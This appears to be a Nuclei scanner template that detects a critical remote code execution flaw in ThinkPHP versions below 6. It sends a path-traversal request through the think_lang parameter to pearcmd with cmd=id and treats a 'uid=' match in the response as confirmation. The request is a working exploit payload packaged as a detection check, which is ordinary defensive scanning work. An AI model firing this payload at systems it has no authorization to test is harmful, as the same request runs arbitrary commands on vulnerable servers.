id: ThinkPHP<6_RCE

info:
  name: ThinkPHP<6_RCE
  author: Jaky
  severity: critical
  description: ThinkPHP<6_RCE

  reference: "https://github.com/Jaky5155"
  tags: ThinkPHP,RCE

requests:
  - method: GET
    path:
      - '{{BaseURL}}/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=id'


    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "uid=.*"
        part: body

      - type: status
        status:
          - 200